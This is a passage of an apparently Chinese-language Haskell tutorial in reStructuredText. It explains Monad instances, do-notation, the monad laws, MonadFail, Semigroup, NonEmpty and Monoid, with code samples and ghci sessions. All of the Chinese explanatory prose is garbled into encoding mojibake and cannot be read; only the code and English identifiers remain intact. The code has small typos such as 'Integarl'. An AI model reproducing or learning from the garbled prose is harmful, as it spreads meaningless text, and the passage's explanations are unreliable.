      -  ``>>`` ÂáΩÊï∞ÔºöÊèê‰æõ‰∫ÜÈªòËÆ§ÁöÑÂÆûÁé∞ÊñπÊ≥ïÔºåÂÆÉÁöÑ‰ΩúÁî®Âíå Applicative ÁöÑ \*> ÂáΩÊï∞‰∏ÄÊ†∑
      -  ``>>=`` ÂáΩÊï∞ÔºàbindÔºâÔºöÊØî Applicative ÂçáÁ∫ßÁöÑÂáΩÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØ‰∏Ä‰∏™Êé•Êî∂ÂÄºËøîÂõûÂçïÂ≠êÁöÑÂáΩÊï∞ÔºåÂ∞ÜËøô‰∏™ÂáΩÊï∞Â∫îÁî®Âú®Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂçïÂ≠ê‰∏≠ÁöÑÂÄº‰∏äÔºåÂπ∂ËøîÂõûÂæóÂà∞ÁöÑÊñ∞ÂçïÂ≠ê

      .. rubric:: ` <#MonadÂÆû‰æã>`__ MonadÂÆû‰æã
         :name: MonadÂÆû‰æã

      .. rubric:: ` <#Maybe-2>`__ Maybe
         :name: Maybe-2

      MaybeÊòØ‰∏Ä‰∏™ÂçïÂ≠êÂÆû‰æãÔºåApplicativeÂ∑≤Áªè‰∏∫ÂÆÉÂÆûÁé∞‰∫ÜreturnÔºåÂõ†Ê≠§Âè™ÈúÄË¶Å>>=ÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         instance Monad Maybe where
             (Just x) >>= f = f x 
             Nothing  >>= _ = Nothing

      Ê†πÊçÆÂÆö‰πâÂ∞±ÂæàÂÆπÊòìÂÆûÁé∞MaybeÁöÑ>>=ÂáΩÊï∞‰∫ÜÔºåËÄå‰∏î‰πüÂæàÂ•ΩÁêÜËß£

      .. container:: float highlight haskell
      ::

         ghci> Just 1 >>= \x -> Just (x + 1)
         Just 2
         ghci> Just 1 >>= \x -> return (x + 1)
         Just 2
         ghci> Nothing >>= \x -> Just (x + 1)
         Nothing
         ghci> Just 1 >>= \x -> Just (x + 1) >> Nothing >>= \y -> Just (y + 1)
         Nothing

      ÊúÄÂêé‰∏Ä‰∏™‰æãÂ≠ê‰∏≠Âá∫Áé∞‰∫Ü >>
      NothingÔºåËøôÊó∂ Nothing ÂâçÁöÑÈÉ®ÂàÜÂÖ®ÈÉΩÁõ∏ÂΩì‰∫éÊ≤°Áî®ÔºåÂõ†‰∏∫ >> Êìç‰ΩúÁ¨¶ÁöÑÂ∑¶Âè≥‰∏§ËæπÂè™Ë¶ÅÊúâ‰∏Ä‰∏™Âá∫Áé∞ NothingÔºåÈÇ£Êï¥‰ΩìÂ∞±‰ºöÊòØ Nothing„ÄÇËøô‰∏™ÁâπÊÄßÂèØ‰ª•Áî®‰∫éÂú®‰∏≠ÈÄîÈöèÊó∂Âà§Êñ≠Â§±ËØØÔºåÂè™Ë¶ÅÊúâ‰∏ÄÂ§ÑÂ§±ËØØÔºåÁªìÊûúÂ∞±‰ºöÊòØ Nothing

      .. rubric:: ` <#-2>`__ []
         :name: -2

      ÂàóË°®‰πüÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         instance Monad [] where
             xs >>= f = concat (map f xs)

      Â∞ÜËøô‰∏™ÂáΩÊï∞Â∫îÁî®Âú®xsÁöÑÊØè‰∏™ÂÄº‰∏äÔºåÂ∞ÜËøîÂõûÁöÑÊâÄÊúâÂàóË°®Âπ≥Èì∫Êàê‰∏Ä‰∏™ÂàóË°®Ôºö

      .. container:: float highlight haskell
      ::

         ghci> [3,4,5] >>= \x -> [x,-x]  
         [3,-3,4,-4,5,-5]  
         ghci> [1,2] >>= \n -> ['a','b'] >>= \ch -> return (n,ch)  
         [(1,'a'),(1,'b'),(2,'a'),(2,'b')]  

      .. rubric:: ` <#IO-2>`__ IO
         :name: IO-2

      IO‰πüÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºå‰ΩÜÊòØÂÆûÁé∞ÊñπÊ≥ïÊØîËæÉÊ∑±Â••ÔºàÈÄÉ

      .. rubric:: ` <#gt-r-2>`__ (->) r
         :name: gt-r-2

      (->)
      r‰πüÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºåÂíåFunctor„ÄÅApplicative‰∏ÄÊ†∑ÔºåÂÖàÂàÜÊûêÂÆÉÁöÑ>>=Á±ªÂûãÁ≠æÂêçÔºö

      (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b

      (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b)

      ‰πüÂèØ‰ª•ÁúãÂá∫Êù•ÔºåÂÆÉÊé•Êî∂‰∏§‰∏™ÂáΩÊï∞f :: r -> a„ÄÅg :: a -> r
      -> bÔºåÁÑ∂ÂêéËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÊï∞h :: r -> b

      ÈÇ£‰πàÂáΩÊï∞hÊé•Êî∂‰∏Ä‰∏™Á±ªÂûã‰∏∫rÁöÑÂèÇÊï∞ÔºåËøîÂõû‰∏Ä‰∏™Á±ªÂûã‰∏∫bÁöÑÂÄº„ÄÇÊâÄ‰ª•ÂÖàÂØπËæìÂÖ•Â∫îÁî®fÂæóÂà∞Á±ªÂûã‰∏∫aÁöÑ‰∏≠Èó¥ÂÄºÔºåÁÑ∂ÂêéÂÜçÂ∞ÜËøô‰∏™ÂÄºÂíåËæìÂÖ•ÂèÇÊï∞‰∏ÄËµ∑‰º†ÂÖ•ÂáΩÊï∞gÂæóÂà∞ÁªìÊûú„ÄÇÊâÄ‰ª•ÂáΩÊï∞hÁöÑÂÆö‰πâÂ∫îËØ•ÊòØÔºö

      \\x -> g (f x) x

      .. container:: float highlight haskell
      ::

         instance Monad ((->) r) where
             f >>= g = \x -> g (f x) x

      .. container:: float highlight haskell
      ::

         ghci> (+3) >>= (+) $ 1
         5
         ghci> (+) <$> (+3) <*> id $ 1
         5

      .. rubric:: ` <#do-notation>`__ do-notation
         :name: do-notation

      Haskell ÁöÑ do ËØ≠Âè•‰∏∫ÈìæÂºèÁöÑ >>= Â∫îÁî®Êèê‰æõ‰∫ÜÂëΩ‰ª§ÂºèÔºàimperative styleÔºâÁöÑËØ≠Ê≥ïÁ≥ñ„ÄÇ
      ÊØîÂ¶Ç ``a >>= \x -> b >> c >>= \y -> d`` Ôºö

      .. container:: float highlight haskell
      ::

         a >>= \x ->
         b >>
         c >>= \y ->
         d

      ÂÖ∂‰∏≠ÊúâabcdÂõõ‰∏™ÂÄºÔºåÂèØ‰ª•ÁúãÂá∫a‰∏≠ÂÜÖÂÆπÁªëÂÆöÂà∞‰∫Üx‰∏äÔºåc‰∏≠ÂÜÖÂÆπÁªëÂÆöÂà∞‰∫Üy‰∏ä„ÄÇ‰ΩøÁî®doËØ≠Âè•Êù•Ë°®Á§∫Ëøô‰∏™Êìç‰ΩúÂèØ‰ª•ÂÜôÊàêÔºö

      .. container:: float highlight haskell
      ::

         do { x <- a 
            ;      b 
            ; y <- c 
            ;      d 
            }

      ÂÖ∂‰∏≠ÁöÑÂ§ßÊã¨Âè∑ÂíåÂàÜÂè∑ÂèØ‰ª•ÁúÅÁï•‰∏çÂÜôÔºàÊå§Âú®‰∏ÄË°åÊó∂‰∏çËÉΩÁúÅÁï•Ôºâ„ÄÇdoËØ≠Âè•‰πüÂè™ÊòØ‰∏Ä‰∏™ËØ≠Ê≥ïÁ≥ñÔºåÂÆÉÂèØ‰ª•ÈÄíÂΩíÂú∞ËΩ¨Êç¢ÊàêÊôÆÈÄöÁöÑMonadÊìç‰ΩúËØ≠Âè•Ôºö

      -  ``do e`` Ôºöe
      -  ``do { e; ... }`` Ôºöe >> do { ‚Ä¶ }
      -  ``do { v <- e; ... }`` Ôºöe >>= \\v -> do { ‚Ä¶ }
      -  ``do { let ...; ... }`` Ôºölet ‚Ä¶ in do { ‚Ä¶ }

      .. rubric:: ` <#ApplicativeDo>`__ ApplicativeDo
         :name: ApplicativeDo

      ÊØîÂ¶ÇÂ¶Ç‰∏ã‰∏Ä‰∏™doËØ≠Âè•Ôºö

      .. container:: float highlight haskell
      ::

         do x <- a 
            y <- b 
            z <- c 
            return (f x y z)

      ÂÆÉÂèØ‰ª•ËΩ¨ÂåñÊàêÔºö

      a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y
      z)

      ‰ΩÜÊòØÁªèËøáËßÇÂØüÂèØ‰ª•ÂèëÁé∞ÔºåÊï¥‰∏™ËØ≠Âè•ÂÆûÈôÖ‰∏äÂ∞ÜÂáΩÊï∞fÂ∫îÁî®Âú®‰∫Ü‰∏â‰∏™‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂÄº‰∏äÔºåÊâÄ‰ª•‰ªÖÁî®ApplicativeÁöÑ<$>Âíå<\*>ÂÆåÂÖ®ÂèØ‰ª•ÂÆûÁé∞Ôºö

      f <$> a <\*> b <\*> c

      ËÄå‰∏îÂú®ËøêË°åÁöÑÊó∂ÂÄôApplicativeÁöÑÊïàÁéá‰ºöÊØîMonadÈ´òÔºåÊâÄ‰ª•Haskell‰ºöÂ∞ÜdoËØ≠Âè•Â∞ΩÂèØËÉΩ‰ºòÂÖàËΩ¨Êç¢‰∏∫ApplicativeÁöÑË°®Á§∫ÊñπÊ≥ïÁÑ∂ÂêéÂÜçËÆ°ÁÆó

      .. rubric:: ` <#Monad-Laws>`__ Monad Laws
         :name: Monad-Laws

      #. ``Left identity`` Ôºö return a >>= k ``=`` k a
      #. ``Right identity`` Ôºöm >>= return ``=`` m
      #. ``Associativity`` Ôºö(m >>= g) >>= h ``=`` m >>=
         (\\x -> g x >>= h)

      Ââç‰∏§‰∏™ÂÆöÂæãÂæàÂ•ΩÁêÜËß£Ôºö

      -  Â∞ÜaÊ≥®ÂÖ•‰∏ä‰∏ãÊñá‰πãÂêéÁªëÂÆöÔºàbindÔºâÁªôÂáΩÊï∞k(:: a -> m
         a)ÔºåÁõ∏ÂΩì‰∫éÁõ¥Êé•Â∞ÜaÁõ¥Êé•‰º†ÂÖ•ÂáΩÊï∞k
      -  Â∞ÜÂ∑≤ÁªèÂåÖÂê´Âú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂÄºÁªëÂÆöÁªôreturnÂáΩÊï∞ÔºåÁõ∏ÂΩì‰∫é‰øùÊåÅ‰∏çÂèò

      Á¨¨‰∏â‰∏™ÂÆöÂæãÊòØÁªìÂêàÂæãÔºåÊääÂÆÉÂÜôÊàêÊõ¥ÂÉèÁªìÂêàÂæãÁöÑË°®Á§∫ÊñπÊ≥ïÊòØÔºö

      (m >>= (\\x -> g x)) >>= h ``=`` m >>= (\\x -> g x >>=
      h)

      .. rubric:: ` <#ÁªÑÂêàËøêÁÆóÁ¨¶Ôºà-gt-gt-ÔºâÂΩ¢Âºè>`__ ÁªÑÂêàËøêÁÆóÁ¨¶Ôºà>=>ÔºâÂΩ¢Âºè
         :name: ÁªÑÂêàËøêÁÆóÁ¨¶Ôºà-gt-gt-ÔºâÂΩ¢Âºè

      ``Control.Monad`` Ê®°Âùó‰∏≠ËøòÂÆö‰πâ‰∫ÜÂáΩÊï∞ ``>=>`` ÔºàKleisli-composition
      operatorÔºâÔºö

      .. container:: float highlight haskell
      ::

         infixr 1 >=>
         (>=>) :: Monad m => (a -> m b) -> (b -> m c) -> (a -> m c)
         f >=> g = \x -> f x >>= g

      ‰ΩøÁî®>=>ËøêÁÆóÁ¨¶ÂèØ‰ª•Â∞Ü‰∏§‰∏™Áî®‰∫éÁªëÂÆöÁöÑÂáΩÊï∞ÁªìÂêàÂú®‰∏ÄËµ∑„ÄÇÁî®ÂÆÉË°®Á§∫ÁöÑMonadÂÆöÂæãÊõ¥Âä†Ê∏ÖÊô∞Áõ¥ËßÇÔºö

      #. ``Left identity`` Ôºöreturn >=> f ``=`` f
      #. ``Right identity`` Ôºöf >=> return ``=`` f
      #. ``Associativity`` Ôºö(f >=> g) >=> h ``=`` f >=> (g
         >=> h)

      .. rubric:: ` <#do-notationÂΩ¢Âºè>`__ do-notationÂΩ¢Âºè
         :name: do-notationÂΩ¢Âºè

      Monad ÁöÑËøô‰∏â‰∏™ÂÆöÂæãËøòÂèØ‰ª•‰ΩøÁî® do ËØ≠Âè•Êù•ÊèèËø∞Ôºö

      #. ``Left identity`` Ôºö

         .. container:: float highlight haskell
         ::

            do { x' <- return x;
                 f x'             =   do { f x } 
               }

      #. ``Right identity`` Ôºö

         .. container:: float highlight haskell
         ::

            do { x <- m; 
                 return x         =   do { m }
               }

      #. ``Associativity`` Ôºö

         .. container:: float highlight haskell
         ::

            do { y <- do { x <- m;       do { x <- m;              do { x <- m;
                           f x                do { y <- f x;            y <- f x;
                         }           =             g y         =        g y
                 g y                             }                    }
               }                            }

      .. rubric:: ` <#Intuition-2>`__ Intuition
         :name: Intuition-2

      Monad‰πüÂèØ‰ª•ÂæàËá™ÁÑ∂Âú∞ÁúãÊàêApplicativeÁöÑÂçáÁ∫ßÁâàÔºåÊØîÂ¶ÇApplicativeÁöÑÊìç‰ΩúÂÖ®ÈÉ®ÊòØÂõ∫ÂÆöÁöÑÔºåËÄåMonadÁöÑÊìç‰ΩúÂèØ‰ª•Âú®‰∏≠ÈÄîÁ™ÅÁÑ∂ÊîπÂèò

      ÂêåÊó∂Monad‰πüÂÆåÊàê‰∫ÜFunctorÂíåApplicativeÊó†Ê≥ïÂÆåÊàêÁöÑÊìç‰Ωú„ÄÇÊØîÂ¶ÇË¶ÅÁî®fmapÂíåÂÆûÁé∞>>=ÂáΩÊï∞ÔºàÂç≥ËææÊàêÊìç‰Ωú
      m a -> (a -> m b) -> m bÔºâÔºåÂÖàÂÅáËÆæ f :: a -> m
      bÔºåÈÇ£‰πàfmap fÁöÑÁ±ªÂûãÂ∞±‰ºöÊòØ m a -> m (m b)ÔºåÂ∞Üm
      aÂ∫îÁî®Âú®fmap f‰∏ä‰ºöÂæóÂà∞ÁªìÊûúm (m b)ÔºåËÄå‰∏çÊòØm
      b„ÄÇ‰ΩÜÊòØÁõÆÂâçÂè™ÂèØ‰ª•‰ΩøÁî®pureÂ∞Ü‰∏Ä‰∏™ÂÄºË£ÖÂÖ•‰∏ä‰∏ãÊñá‰∏≠Ôºàa -> m
      aÔºâÔºåËÄåÊ≤°Êúâ‰∏Ä‰∏™ÂáΩÊï∞ÂèØ‰ª•‰ªé‰∏ä‰∏ãÊñá‰∏≠ÊèêÂèñÂÄºÔºàm a ->
      aÔºâ„ÄÇÈÇ£‰πàÂ∞±ÈúÄË¶ÅÂÆö‰πâ‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÊï∞Êù•ÂÆûÁé∞Ëøô‰∏™Êìç‰ΩúÁöÑÊïàÊûúÔºàm
      (m b) -> m bÔºâ„ÄÇÂõ†Ê≠§MonadÁöÑÂè¶‰∏Ä‰∏™Á≠âÊïàÁöÑÂÆö‰πâÊñπÊ≥ïÊòØÔºö

      .. container:: float highlight haskell
      ::

         class Applicative m => Monad' m where
             join :: m (m a) -> m a 
             
             (>>=) :: m a -> (a -> m b) -> m b 
             x >>= f = join $ fmap f x

      ‰ΩÜÊòØÂÆö‰πâ>>=ÂáΩÊï∞‰ºöÊõ¥‰∏∫Áõ¥ËßÇÊñπ‰æøÔºåÊâÄ‰ª•HaskellÈááÁî®‰∫ÜÁî®>>=ÂáΩÊï∞ÂÆö‰πâMonadÁöÑÊñπÊ≥ï

      ÂêåÊó∂HaskellËøòÊèê‰æõ‰∫ÜjoinÂáΩÊï∞ÁöÑÂÆö‰πâÔºö

      .. container:: float highlight haskell
      ::

         join :: Monad m => m (m a) -> m a 
         join x = x >>= id

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞-2>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞-2

      .. rubric:: ` <#liftM-amp-ap>`__ liftM & ap
         :name: liftM-amp-ap

      liftM :: Monad m => (a -> b) -> m a -> m b

      ap :: Monad m => m (a -> b) -> m a -> m b

      ÊâÄ‰ª•liftMÂÖ∂ÂÆûÂ∞±ÊòØfmap„ÄÅapÂ∞±ÊòØ<\*>Ôºå‰ΩÜÊòØËÄÅÁâàÊú¨ÁöÑGHCÂÆö‰πâMonadÂπ∂Ê≤°ÊúâFunctor„ÄÅApplicativeÁöÑÁ∫¶ÊùüÔºåÊâÄ‰ª•ÂÆûÁé∞‰∫ÜliftM„ÄÅapÔºåÂπ∂‰∏î‰øùÁïô‰∫ÜËøô‰∏™ÂêçÂ≠ó

      Âõ†Ê≠§‰∏Ä‰∏™ÂçïÂ≠ê‰πüÂèØ‰ª•ÈÄöËøá ``pure = return`` „ÄÅ ``(<*>) = ap`` Áõ¥Êé•Êàê‰∏∫Â∫îÁî®ÂáΩÂ≠êÁöÑÂÆû‰æã

      .. rubric:: ` <#sequence-1>`__ sequence
         :name: sequence-1

      sequence :: Monad m => [m a] -> m [a]

      sequenceÁöÑ‰ΩúÁî®ÊòæËÄåÊòìËßÅÔºåËÄå‰∏îÂú®IOÈÉ®ÂàÜ‰πü‰ΩøÁî®Âà∞‰∫Ü„ÄÇ‰ΩÜÊòØËøô‰∏™ÁâàÊú¨ÊòØÂú® ``GHC.Base`` Ê®°Âùó‰∏≠ÂÆö‰πâÁöÑÔºåËøòÊúâ‰∏Ä‰∏™Êõ¥ÂπøÊ≥õÁöÑ‰ΩøÁî®TraversableÁöÑÂÆö‰πâÂú® ``Data.Traversable`` Ê®°Âùó‰∏≠

      .. rubric:: ` <#replicateM>`__ replicateM
         :name: replicateM

      replicateM :: Applicative m => Int -> m a -> m [a]

      .. rubric:: ` <#mapM-amp-forM>`__ mapM & forM
         :name: mapM-amp-forM

      mapM :: Monad m => (a -> m b) -> [a] -> m [b]

      forM :: Monad m => [a] -> (a -> m b) -> m [b]

      forMÁöÑÁî®Ê≥ïÂú®IOÈÉ®ÂàÜÂ∑≤ÁªèËØ¥ËøáÔºåmapMÂíåforMÈÉΩÂú® ``Data.Traversable`` Ê®°Âùó‰∏≠ÊúâÂπøÊ≥õÁâàÊú¨

      ËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÂáΩÊï∞ÔºöfilterM„ÄÅzipWithM„ÄÅfoldM„ÄÅforeverÔºåÈÄöËøáÂêçÂ≠óÂ∞±ÂèØ‰ª•ÁúãÂá∫Áî®Ê≥ïÔºåÊòØÂ∞ÜÂéüÊù•‰ªÖ‰ΩøÁî®‰∏éÂàóË°®ÁöÑÂáΩÊï∞ÊèêÂçáËá≥ÂèØ‰ª•ÈÄÇÁî®‰∫éÊâÄÊúâÂçïÂ≠ê

      Âπ∂‰∏îÂú®ÂáΩÊï∞ÂêçÂêéÂä†‰∏ãÂàíÁ∫øÔºåÊØîÂ¶Çsequence\_„ÄÅmapM\_Ôºå‰ºöÂøΩÁï•ËøîÂõûÂÄºÔºàÊúÄÁªàÁªìÊûú‰∏∫ ``m ()`` Ôºâ

      .. rubric:: ` <#lt-lt-amp-gt-gt-amp-lt-lt>`__ =<< &
         >=> & <=<
         :name: lt-lt-amp-gt-gt-amp-lt-lt

      Ôºà ``>=>`` Êìç‰ΩúÁ¨¶Âú®‰∏äÈù¢ `Monad
      Laws <#%E7%BB%84%E5%90%88%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88-gt-gt-%EF%BC%89%E5%BD%A2%E5%BC%8F>`__ ÈÉ®ÂàÜÂ∑≤ÁªèÁªôÂá∫‰∫ÜÂÆö‰πâÔºâ

      -  x >>= f ``=`` f =<< x
      -  f >=> g ``=`` g <=< f


   .. rubric:: ` <#MonadFail>`__ MonadFail
      :name: MonadFail

      MonadFailÂÆö‰πâÂú® ``Control.Monad.Fail`` Ê®°Âùó‰∏≠Ôºö

      .. container:: float highlight haskell
      ::

         class Monad m => MonadFail m where
             fail :: String -> m a 

      ÂÆÉÂè™Ë¶ÅÊ±ÇÂú®MonadÁöÑÂü∫Á°Ä‰∏äÂÆûÁé∞failÂáΩÊï∞ÔºåÊé•Êî∂‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ËøîÂõû‰∏Ä‰∏™ÂçïÂ≠ê„ÄÇËøô‰ºö‰ΩøÂú®doËØ≠Âè•‰∏≠‰∫ßÁîüÈîôËØØÊó∂Áõ¥Êé•Âèò‰∏∫ÈîôËØØÂÄºÔºàÁ©∫ÂÄºÔºâ‰ΩøÊúÄÁªàÁöÑËøîÂõûÂÄº‰∏∫ÈîôËØØÂÄº

      .. rubric:: ` <#MonadFailÂÆû‰æã>`__ MonadFailÂÆû‰æã
         :name: MonadFailÂÆû‰æã

      .. container:: float highlight haskell
      ::

         instance MonadFail Maybe where
             fail _ = Nothing

         instance MonadFail [] where
             fail _ = []

         instance MonadFail IO where
             fail = failIO

      MaybeÂíå[]ÁöÑfailÂáΩÊï∞ÈÉΩ‰∏éÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Êó†ÂÖ≥ÔºåÁõ¥Êé•ËøîÂõûÁ©∫ÂÄºÔºàNothing„ÄÅ[]ÔºâÔºõËÄåIOÁöÑfailÂáΩÊï∞Áõ¥Êé•‰ΩøÁî®failIOÔºåÂÆûÁé∞ÊñπÊ≥ï‰πüÊòØÊ∑±Â••ÔºàÊé•ÁùÄÈÄÉ

      .. container:: float highlight haskell
      ::

         exampleFail :: Maybe Char 
         exampleFail = do
             (x:xs) <- Just ""
             return x 

         ghci> exampleFail
         Nothing

      Âú®Ëøô‰∏™‰æãÂ≠êÁöÑdoËØ≠Âè•‰∏≠ÔºåÂú®ÊèêÂèñJust
      ‚Äú‚Äù‰∏≠ÁöÑÂÄºÊó∂Áî®‰∫ÜÊ®°ÂºèÂåπÈÖçÔºå‰ΩÜÊòØÂõ†‰∏∫ÂÖ∂ÂÜÖÂÆπ‰∏∫Á©∫Â≠óÁ¨¶‰∏≤Ôºåx:xsÂåπÈÖç‰ºöÂá∫Áé∞ÈîôËØØÔºåËøôÊó∂Â∞±‰ºöËß¶ÂèëfailÂáΩÊï∞Áõ¥Êé•ËøîÂõûNothing

      .. rubric:: ` <#MonadFail-Law>`__ MonadFail Law
         :name: MonadFail-Law

      -  fail s >>= m ``=`` fail s


   .. rubric:: ` <#Semigroup>`__ Semigroup
      :name: Semigroup

      ÂçäÁæ§ÔºàsemigroupÔºâÊòØ‰∏Ä‰∏™ÈõÜÂêà$S$ÔºåÂÆÉÈúÄË¶ÅÊåáÂÆö‰∏Ä‰∏™‰∫åÂÖÉËøêÁÆóÁ¨¶$\\oplus$ÔºåÂπ∂‰∏îÊª°Ë∂≥

      | $$
      | a\\oplus b \\in S\\quad a, b\\in S
      | $$

      ‰ª•ÂèäÁªìÂêàÔºàassociativeÔºâÂæãÔºö

      | $$
      | (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c)
      | $$

      Ëøô‰∏™‰∫åÂÖÉËøêÁÆóÁ¨¶Âú®HaskellÁöÑSemigroup‰∏≠Ë¢´ÂÆö‰πâ‰∏∫ ``<>`` ÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         class Semigroup a where
             (<>) :: a -> a -> a 

             sconcat :: NonEmpty a -> a 
             sconcat (a :| as) = go a as where 
                 go b (c:cs) = b <> go c cs 
                 go b []     = b
             
             stimes :: Integarl b => b -> a -> a 
             stimes = ...

      Èô§Ê≠§‰πãÂ§ñËøòÊúâ ``sconcat`` Âíå ``stimes`` ÂáΩÊï∞ÔºåÈÉΩÁªôÂá∫‰∫ÜÈªòËÆ§ÂÆûÁé∞„ÄÇÂØπ‰∫éÂàóË°®Ôºå<>Áõ∏ÂΩì‰∫é(++)ÔºåstimesÁõ∏ÂΩì‰∫éconcat
      . replicateÔºö

      .. container:: float highlight haskell
      ::

         ghci> [1, 2] <> [3, 4]
         [1,2,3,4]
         ghci> sconcat $ fromList [[1, 2], [3, 4]]
         [1,2,3,4]
         ghci> stimes 3 [1, 2]
         [1,2,1,2,1,2]

      .. rubric:: ` <#Semigroup-Law>`__ Semigroup Law
         :name: Semigroup-Law

      -  (x <> y) <> z ``=`` x <> (y <> z)

      .. rubric:: ` <#Ë°•ÔºöNonEmpty>`__ Ë°•ÔºöNonEmpty
         :name: Ë°•ÔºöNonEmpty

      NonEmptyË°®Á§∫ÈùûÁ©∫ÂàóË°®ÔºåÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         data NonEmpty a = a :| [a] deriving (Eq, Ord)

      ‰ΩøÁî®‰∏Ä‰∏™ÂÖÉÁ¥†Âíå‰∏Ä‰∏™ÂàóË°®Áî® ``:|`` ËøûÊé•Â∞±ÂèØ‰ª•ÁîüÊàê‰∏Ä‰∏™NonEmptyÁ±ªÂûãÁöÑÂàóË°®

      ``Data.List.NonEmpty`` Ê®°Âùó‰∏≠ÂÆûÁé∞‰∫ÜÂæàÂ§öÊôÆÈÄöÂàóË°®ÊúâÁöÑÂáΩÊï∞ÔºåÈúÄË¶Åqualified
      importÂêéË∞ÉÁî®Ôºå‰ΩøÁî®fromList„ÄÅtoListÂáΩÊï∞ÂèØ‰ª•Âú®ÊôÆÈÄöÂàóË°®ÂíåÈùûÁ©∫ÂàóË°®‰πãÈó¥ËΩ¨Êç¢

      .. container:: float highlight haskell
      ::

         ghci> import qualified Data.List.NonEmpty as NE
         ghci> arr = NE.fromList [1, 2, 3]
         ghci> arr
         1 :| [2,3]
         ghci> NE.head arr 
         1
         ghci> NE.tail arr 
         [2,3]


   .. rubric:: ` <#Monoid>`__ Monoid
      :name: Monoid

      Âπ∫ÂçäÁæ§ÔºàMonoidÔºâÊòØ‰∏Ä‰∏™ÊúâÂçï‰ΩçÂÖÉÁ¥†$e$ÁöÑÂçäÁæ§ÔºåÂç≥$e$Êª°Ë∂≥Ôºö

      | $$
      | e\\oplus x = x\\oplus e = x
      | $$

      .. container:: float highlight haskell
      ::

         class Semigroup a => Monoid a where 
             mempty  :: a 
             
             mappend :: a -> a -> a 
             mappend = (<>)

             mconcat :: [a] -> a 
             mconcat = foldr mappend mempty 

      ÂèØ‰ª•ÁúãÂá∫MonoidË¶ÅÊ±Ç‰∫Ü‰∏â‰∏™ÂáΩÊï∞ÔºåÂÖ∂‰∏≠ÊúÄÂ∞ëÂè™ÈúÄË¶Å ``mempty`` ÔºåÂÆÉÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™ÂÄºÔºåË°®Á§∫Âçï‰ΩçÂÖÉÁ¥†„ÄÇ ``mappend`` Âç≥Semigroup‰∏≠ÁöÑ<>ËøêÁÆóÁ¨¶Ôºå ``mconcat`` ‰πüÊèê‰æõ‰∫ÜÈªòËÆ§ÂÆûÁé∞

      .. rubric:: ` <#ÂÆû‰æã>`__ ÂÆû‰æã
         :name: ÂÆû‰æã

      .. rubric:: ` <#a-1>`__ [a]
         :name: a-1

      Âõ†‰∏∫MonoidÁöÑÂÆû‰æãÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûãÔºåËÄå‰∏çÊòØÂÉèFunctorÁ≠â‰∏ÄÊ†∑Á≠âÁ±ªÂûãÊûÑÈÄ†Âô®ÔºåÊâÄ‰ª•[]Âπ∂‰∏çÊòØMonoidÁöÑÂÆû‰æãÔºå‰ΩÜÊòØÂÖ∑‰ΩìÁ±ªÂûã[a]ÊòØ‰∏Ä‰∏™Âπ∫ÂçäÁæ§Ôºö

      .. container:: float highlight haskell
      ::

         instance Semigroup [a] where 
             (<>) = (++)

         instance Monoid [a] where 
             mempty = [] 
             mconcat xss = [x | xs <- xss, x <- xs]

      ÂàóË°®ÁöÑÂçï‰ΩçÂÖÉÁ¥†(mempty)Â∞±ÊòØÁ©∫ÂàóË°®[]ÔºåËøêÁÆóÁ¨¶Â∞±ÊòØÂêàÂπ∂ÂàóË°®(++)Ôºåmconcat‰πüÁî®ÂàóË°®Êé®ÂØºÈáçÊñ∞ÂÆûÁé∞ÊèêÈ´òÊïàÁéá

      .. container:: float highlight haskell
      ::

         ghci> mempty :: [Int] 
         []
         ghci> [1, 2] <> [3, 4]
         [1,2,3,4]
         ghci> [1, 2] `mappend` [3, 4]
         [1,2,3,4]
         ghci> mconcat [[1,2], [3,4]]
         [1,2,3,4]

      .. rubric:: ` <#Ordering>`__ Ordering
         :name: Ordering

      .. container:: float highlight haskell
      ::

         instance Semigroup Ordering where
             LT <> _ = LT
             EQ <> y = y
             GT <> _ = GT

         instance Monoid Ordering where
             mempty = EQ

      ‰∏ªË¶ÅÂèØ‰ª•Áî®‰∫éÊØîËæÉÂ≠óÂÖ∏Â∫èÔºö

      .. container:: float highlight haskell
      ::

         ghci> mconcat (zipWith compare "abcd" "acbd")
         LT

      .. rubric:: ` <#Sum-amp-Product>`__ Sum & Product
         :name: Sum-amp-Product

      ÂØπ‰∫éÊï∞Â≠óÔºåÂä†Ê≥ïÂíå‰πòÊ≥ïÈÉΩÊª°Ë∂≥ÁªìÂêàÂæãÔºåÊâÄ‰ª•ÂØπ‰∫éNumÔºåÊúâ‰∏§ÁßçÂÆûÁé∞MonoidÁöÑÊñπÂºèÔºå‰ΩÜÊòØ‰∏çËÉΩ‰∏∫Âêå‰∏ÄÁ±ªÂûãËÆæÁΩÆ‰∏§ÁßçÂÆû‰æãÊñπÂºèÔºåÊâÄ‰ª• ``Data.Monoid`` ‰∏≠Êèê‰æõ‰∫Ü‰∏§‰∏™ÂåÖË£ÖÂô®‚Äî‚Äî‚Äî‚ÄîSumÂíåProductÔºö

      .. container:: float highlight haskell
      ::

         newtype Sum a = Sum {getSum :: a} deriving (...)
         newtype Product a = Product {getProduct :: a} deriving (...)

